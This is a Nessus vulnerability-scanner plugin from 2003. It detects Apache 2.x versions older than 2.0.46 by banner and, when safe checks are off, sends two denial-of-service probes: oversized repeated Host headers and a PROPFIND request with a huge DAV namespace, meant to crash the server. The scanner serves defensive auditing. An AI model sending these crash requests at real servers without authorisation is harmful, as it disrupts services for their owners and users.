#
# This script was written by Renaud Deraison <deraison@cvs.nessus.org>
#
# See the Nessus Scripts License for details
#
# Ref:
#  Date: Wed, 28 May 2003 12:29:03 -0400 (EDT)
#  From: Apache HTTP Server Project <jwoolley@apache.org>
#  To: <bugtraq@securityfocus.com>
#  Subject: [SECURITY] [ANNOUNCE] Apache 2.0.46 released



if(description)
{
 script_id(11665);
 if(defined_func("script_xref"))script_xref(name:"IAVA", value:"2003-t-0012");
 script_bugtraq_id(7723, 7725);
 script_cve_id("CVE-2003-0245", "CVE-2003-0189");
 if ( defined_func("script_xref") ) script_xref(name:"RHSA", value:"RHSA-2003:186-01");

 script_version("$Revision: 1.12 $");
 
 name["english"] = "Apache < 2.0.46";

 script_name(english:name["english"]);
 
 desc["english"] = "
The remote host appears to be running a version of
Apache 2.x which is older than 2.0.46

This version is vulnerable to various flaws :

- There is a denial of service vulnerability which may allow
an attacker to disable basic authentication on this host

- There is a denial of service vulnerability in the mod_dav module
which may allow an attacker to crash this service remotely

Solution : Upgrade to version 2.0.46
See also : http://www.apache.org/dist/httpd/CHANGES_2.0
Risk factor : Medium";

 script_description(english:desc["english"]);
 
 summary["english"] = "Checks for version of Apache";
 
 script_summary(english:summary["english"]);
 
 script_category(ACT_MIXED_ATTACK);
 
 
 script_copyright(english:"This script is Copyright (C) 2003 Renaud Deraison",
		francais:"Ce script est Copyright (C) 2003 Renaud Deraison");
 family["english"] = "Web Servers";
 script_family(english:family["english"]);
 script_dependencie("find_service.nes", "no404.nasl", "http_version.nasl");
 script_require_keys("www/apache");
 script_require_ports("Services/www", 80);
 exit(0);
}

#
# The script code starts here
#
include("http_func.inc");
include("backport.inc");

port = get_http_port(default:80);

if(!get_port_state(port))exit(0);
if ( get_kb_item("Services/www/" + port + "/embedded") ) exit(0);


banner = get_backport_banner(banner:get_http_banner(port: port));
if(!banner)exit(0);
 
serv = strstr(banner, "Server");
if(ereg(pattern:"^Server:.*Apache(-AdvancedExtranetServer)?/2\.0\.([0-9][^0-9]|[0-3][0-9]|4[0-5])", string:serv))
 {
   security_warning(port);
 }
 
if(safe_checks())exit(0);



#
# I could not make these exploits to work (RH8.0), but we'll include them
# anyway.
#
if (! safe_checks())
{

if(http_is_dead(port:port))exit(0);

soc = http_open_socket(port);
if(!soc)exit(0);

poison = NULL;

for(i=0;i<10;i++)
{
 poison += string("Host: ", crap(2000), "\r\n");
}

req = string("GET / HTTP/1.1\r\n",
poison, "\r\n\r\n");
send(socket:soc, data:req);
r = http_recv(socket:soc);
close(soc);

if(http_is_dead(port:port)) { security_warning(port); exit(0); }


xml = '<?xml version="1.0"?>\r\n' + 
      '<a:propfind xmlns:a="' + 'DAV:' + crap(20000) + '">\r\n' +
      '    <a:allprop/>\r\n' +
      '</a:propfind>';
     

soc = http_open_socket(port);
req = string("PROPFIND / HTTP/1.1\r\n",
	     poison,
	     "Depth: 1\r\n" ) + 
	     'Content-Type: text/xml; charset="utf-8"' + string("\r\n") +
	     'Content-Length: ' + strlen(xml) + '\r\n\r\n';

send(socket:soc, data:req+xml);
r = http_recv(socket:soc);
if(http_is_dead(port:port))security_warning(port);
}
